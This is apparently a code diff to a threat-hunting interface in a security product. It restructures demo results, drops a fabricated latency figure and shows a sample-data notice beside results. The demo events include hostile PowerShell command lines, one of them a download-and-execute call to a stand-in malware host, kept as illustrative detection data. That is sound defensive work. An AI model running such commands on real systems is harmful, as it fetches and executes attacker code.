@@ -128,6 +128,7 @@ LIMIT 200`,
 const DEMO_RESULTS: HuntResult[] = [
   {
     id: 'r-001',
+    eventType: 'ProcessCreation',
     timestamp: '2026-05-06T11:48:00Z',
     source: 'crowdstrike',
     severity: 'high',
@@ -139,10 +140,11 @@ const DEMO_RESULTS: HuntResult[] = [
         'powershell.exe -nop -w hidden -enc JABXAGUAYgBDA...',
       'process.parent.name': 'EXCEL.EXE',
     },
-    highlight: 'powershell.exe -nop -w hidden -enc',
+    highlights: ['powershell.exe -nop -w hidden -enc'],
   },
   {
     id: 'r-002',
+    eventType: 'ProcessCreation',
     timestamp: '2026-05-06T11:19:00Z',
     source: 'defender',
     severity: 'critical',
@@ -154,10 +156,11 @@ const DEMO_RESULTS: HuntResult[] = [
         "powershell.exe -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://malware.xyz/payload')\"",
       'network.destination.ip': '185.220.101.45',
     },
-    highlight: 'IEX (New-Object Net.WebClient).DownloadString',
+    highlights: ['IEX (New-Object Net.WebClient).DownloadString'],
   },
   {
     id: 'r-003',
+    eventType: 'ProcessCreation',
     timestamp: '2026-05-06T10:00:00Z',
     source: 'splunk',
     severity: 'medium',
@@ -168,6 +171,7 @@ const DEMO_RESULTS: HuntResult[] = [
       'process.command_line':
         'powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\maria.lin\\setup.ps1',
     },
+    highlights: [],
   },
 ];
 
@@ -537,12 +541,12 @@ function SavedList({
 function ResultRow({ result }: { result: HuntResult }) {
   const [open, setOpen] = useState(false);
   const fieldEntries = useMemo(
-    () => Object.entries(result.fields ?? {}),
+    () => Object.entries(result.fields),
     [result.fields],
   );
   const summaryFields = ['host', 'user', 'process.name', 'process.command_line'];
   const summary = summaryFields
-    .map((k) => [k, result.fields?.[k]] as const)
+    .map((k) => [k, result.fields[k]] as const)
     .filter(([, v]) => v != null && v !== '');
 
   return (
@@ -609,7 +613,7 @@ function ResultRow({ result }: { result: HuntResult }) {
             </button>
             <button
               onClick={() => {
-                const host = result.fields?.host;
+                const host = result.fields.host;
                 const url = host ? `/graph?entity=${encodeURIComponent(String(host))}` : '/graph';
                 window.location.href = url;
               }}
@@ -810,21 +814,32 @@ export function HuntView() {
       // generates illustrative events rather than querying the lake, and says
       // so with `source: "sample"` — trusting the status code alone is how a
       // green "Live backend" pill ended up sitting over fabricated telemetry.
-      setSampleSource(
-        (res as { source?: string }).source === 'sample' ||
-          Boolean((res as { notice?: string }).notice),
-      );
-      setSampleNotice((res as { notice?: string }).notice ?? null);
+      //
+      // These used to be inline `(res as { source?: string })` casts, because
+      // the declared type carried neither field. The cast was the tell.
+      setSampleSource(res.source === 'sample' || Boolean(res.notice));
+      setSampleNotice(res.notice);
     } catch (err) {
       setRunError(err);
       const sample = demoFallback(DEMO_RESULTS);
       if (sample) {
         // The hosted demo has no lake to query.
-        setResults({ total: sample.length, took: 0, hits: sample });
+        const notice =
+          'The hunt backend is unreachable, so these are illustrative sample events rather than results from your telemetry.';
+        setResults({
+          query: q,
+          total: sample.length,
+          // No query ran, so there is no latency to publish. This was
+          // `took: 0`, which is the same claim as the `took: 42` removed
+          // before it with a humbler number — a measurement of something
+          // nobody measured, rendered beside a real hit count.
+          tookMs: null,
+          hits: sample,
+          source: 'sample',
+          notice,
+        });
         setSampleSource(true);
-        setSampleNotice(
-          'The hunt backend is unreachable, so these are illustrative sample events rather than results from your telemetry.',
-        );
+        setSampleNotice(notice);
         return;
       }
       // Everywhere else a failed hunt reads as a failed hunt. The old branch
@@ -1190,7 +1205,9 @@ export function HuntView() {
                 {results && (
                   <span className="ml-2 text-xs font-normal text-slate-400">
                     {results.total.toLocaleString()} hits ·{' '}
-                    {results.took.toLocaleString()}ms
+                    {results.tookMs === null
+                      ? 'latency not measured'
+                      : `${results.tookMs.toLocaleString()}ms`}
                   </span>
                 )}
               </h3>
@@ -1205,6 +1222,17 @@ export function HuntView() {
                 </button>
               )}
             </div>
+
+            {/* The "Sample data" pill sits in the hero header, which renders
+                only once the hero has been dismissed — so pressing Run hunt
+                straight away showed generated events with no disclosure at
+                all, which is the one path the search endpoint always takes
+                today. The marker belongs with the results it describes. */}
+            {results && sampleSource && sampleNotice && (
+              <p className="border-b border-amber-500/20 bg-amber-500/5 px-4 py-2 text-[11px] leading-snug text-amber-300/90">
+                {sampleNotice}
+              </p>
+            )}
 
             {running ? (
               <div className="space-y-2 p-4">
